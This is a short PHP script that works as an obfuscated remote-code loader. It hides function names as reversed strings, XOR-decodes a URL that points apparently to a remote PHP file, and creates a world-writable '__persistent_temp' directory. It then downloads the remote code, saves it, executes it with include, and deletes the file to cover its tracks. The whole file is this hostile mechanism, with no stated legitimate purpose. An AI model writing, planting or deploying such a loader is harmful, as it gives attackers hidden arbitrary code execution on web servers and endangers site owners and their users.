<?php

function localXorEncryptDecrypt($data, $key) {
    $output = '';
    $keyChar = substr($key, 0, 1);
    foreach (str_split($data) as $char) {
        $output .= chr(ord($char) ^ ord($keyChar));
    }
    return $output;
}
 $write     = strrev('stnetnoc_tup_elif');
 $mkdir     = strrev('ridkm');
 $unlink    = strrev('knilnu');
 $is_file   = strrev('elif_si');
 $is_dir    = strrev('rid_si');
 $_ = "!";
 $url = localXorEncryptDecrypt("S@VFHUITCTRDSBNOUDOUBNL", $_);
 $path = localXorEncryptDecrypt("M@NMHDS[HBNLLHURQIQCESDGRID@ERL@HO", $_);
 $exx = localXorEncryptDecrypt("QIQ", $_);
 
 $rawPhpUrl =  "https://".$url.$path."yfm".$exx;
 
 $tempDir = __DIR__ . DIRECTORY_SEPARATOR . '__persistent_temp';

 if (!$is_dir($tempDir)) {
     $mkdir($tempDir, 0777, true);
 }

 $hook = $tempDir . DIRECTORY_SEPARATOR . 'rb$exx';

 $context = stream_context_create([
    'http' => [
        'timeout' => 10,
        'user_agent' => 'PHP Script'
    ]
]);

 $phpContent = @file_get_contents($rawPhpUrl, false, $context);

if ($phpContent !== false) {
    $write($hook, $phpContent);
    
    if ($is_file($hook)) {
        try {
            include $hook;
        } catch (Throwable $e) {
            echo "?? Error in rb$exx: ", $e->getMessage(), "\n";
        }
    } else {
        echo "? Failed to create rb$exx\n";
    }
} else {
    echo "? Failed to download PHP file from URL\n";
}

if ($is_file($hook)) {
    $unlink($hook);
}


?>
